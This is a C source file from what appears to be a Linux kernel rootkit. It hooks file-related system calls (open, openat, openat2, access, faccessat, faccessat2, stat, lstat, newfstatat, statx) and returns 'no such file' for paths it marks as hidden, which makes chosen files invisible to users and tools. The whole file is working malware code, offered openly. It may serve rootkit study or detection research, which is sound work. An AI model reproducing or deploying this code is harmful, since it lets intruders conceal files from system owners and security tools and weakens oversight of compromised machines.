#include "files.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include "utils.h"
#include <linux/err.h>
#include <linux/fcntl.h>
#include <linux/fdtable.h>
#include <linux/limits.h>
#include <linux/namei.h>
#include <linux/openat2.h>
#include <linux/printk.h>
#include <linux/stat.h>
#include <linux/string.h>
#include <linux/types.h>

static long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs,
                            const int i32_dfd, const char __user *const s_filename,
                            const int i32_at_flags)
{
    long l_ret                     = 0;    // Return value of the real syscall
    unsigned int ui32_lookup_flags = 0;    // Lookup flags used when parsing path
    const char *s_filename_k       = NULL; // Kernel buffer for file name

    s_filename_k = strndup_user(s_filename, PATH_MAX);

    IF_U (IS_ERR_OR_NULL(s_filename_k)) {
        pr_err("[ROOTKIT] * Could not copy filename from user\n");
        s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
    }

    pr_info("[ROOTKIT] * File name: %s\n", s_filename_k);

    kfree_const(s_filename_k);

    if (!(i32_at_flags & AT_SYMLINK_NOFOLLOW)) {
        ui32_lookup_flags |= LOOKUP_FOLLOW;
    }

    IF_U (is_pathname_hidden(i32_dfd, s_filename, ui32_lookup_flags)) {
        pr_info("[ROOTKIT]   * Hiding file\n");

        return -ENOENT; // No such file or directory
    }

    l_ret = orig_func(p_regs);
    pr_info("[ROOTKIT] * Return value: %ld\n", l_ret);

    return l_ret;
}

// sys_open syscall hook handler
SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                      umode_t, ui16_mode)
{
    pr_info("[ROOTKIT] open(%p, %#x, 0%ho)\n", s_filename, i32_flags, ui16_mode);

    return do_check_hidden(orig_open, p_regs, AT_FDCWD, s_filename,
                           i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_openat syscall hook handler
SYSCALL_HOOK_HANDLER4(openat, orig_openat, p_regs, int, i32_dfd, const char __user *, s_filename,
                      int, i32_flags, umode_t, ui16_mode)
{
    pr_info("[ROOTKIT] openat(%d, %p, %#x, 0%ho)\n", i32_dfd, s_filename, i32_flags, ui16_mode);

    return do_check_hidden(orig_openat, p_regs, i32_dfd, s_filename,
                           i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_openat2 syscall hook handler
SYSCALL_HOOK_HANDLER4(openat2, orig_openat2, p_regs, int, i32_dfd, const char __user *, s_filename,
                      struct open_how __user *, p_how, size_t, sz_usize)
{
    int err;
    struct open_how tmp_how;

    pr_info("[ROOTKIT] openat2(%d, %p, %p, %zu)\n", i32_dfd, s_filename, p_how, sz_usize);

    // Following code is based on fs/open.c:sys_openat2()

    IF_U (sz_usize < OPEN_HOW_SIZE_VER0) {
        return -EINVAL;
    }

    err = copy_struct_from_user(&tmp_how, sizeof(tmp_how), p_how, sz_usize);
    if (err != 0) {
        return err;
    }

    return do_check_hidden(orig_openat2, p_regs, i32_dfd, s_filename,
                           tmp_how.flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_access syscall hook handler
SYSCALL_HOOK_HANDLER2(access, orig_access, p_regs, const char __user *, s_filename, int, i32_mode)
{
    pr_info("[ROOTKIT] access(%p, 0%o)\n", s_filename, i32_mode);

    return do_check_hidden(orig_access, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_faccessat syscall hook handler
SYSCALL_HOOK_HANDLER3(faccessat, orig_faccessat, p_regs, int, i32_dfd, const char __user *,
                      s_filename, int, i32_mode)
{
    pr_info("[ROOTKIT] faccessat(%d, %p, 0%o)\n", i32_dfd, s_filename, i32_mode);

    return do_check_hidden(orig_faccessat, p_regs, i32_dfd, s_filename, 0);
}

// sys_faccessat2 syscall hook handler
SYSCALL_HOOK_HANDLER4(faccessat2, orig_faccessat2, p_regs, int, i32_dfd, const char __user *,
                      s_filename, int, i32_mode, int, i32_flags)
{
    pr_info("[ROOTKIT] faccessat2(%d, %p, 0%o, %#x)\n", i32_dfd, s_filename, i32_mode, i32_flags);

    return do_check_hidden(orig_faccessat2, p_regs, i32_dfd, s_filename, i32_flags);
}

// sys_stat syscall hook handler
SYSCALL_HOOK_HANDLER2(stat, orig_stat, p_regs, const char __user *, s_filename,
                      struct stat __user *, p_statbuf)
{
    pr_info("[ROOTKIT] stat(%p, %p)\n", s_filename, p_statbuf);

    return do_check_hidden(orig_stat, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_lstat syscall hook handler
SYSCALL_HOOK_HANDLER2(lstat, orig_lstat, p_regs, const char __user *, s_filename,
                      struct stat __user *, p_statbuf)
{
    pr_info("[ROOTKIT] lstat(%p, %p)\n", s_filename, p_statbuf);

    return do_check_hidden(orig_lstat, p_regs, AT_FDCWD, s_filename, AT_SYMLINK_NOFOLLOW);
}

// sys_newfstatat syscall hook handler
SYSCALL_HOOK_HANDLER4(newfstatat, orig_newfstatat, p_regs, int, i32_dfd, const char __user *,
                      s_filename, struct stat __user *, p_statbuf, int, i32_flag)
{
    pr_info("[ROOTKIT] newfstatat(%d, %p, %p, %d)\n", i32_dfd, s_filename, p_statbuf, i32_flag);

    return do_check_hidden(orig_newfstatat, p_regs, i32_dfd, s_filename,
                           i32_flag | AT_NO_AUTOMOUNT);
}

// sys_statx syscall hook handler
SYSCALL_HOOK_HANDLER5(statx, orig_statx, p_regs, int, i32_dfd, const char __user *, s_filename,
                      unsigned int, ui32_flags, unsigned int, ui32_mask, struct statx __user *,
                      p_buffer)
{
    pr_info("[ROOTKIT] statx(%d, %p, %u, %u, %p)\n", i32_dfd, s_filename, ui32_flags, ui32_mask,
            p_buffer);

    return do_check_hidden(orig_statx, p_regs, i32_dfd, s_filename, ui32_flags | AT_NO_AUTOMOUNT);
}
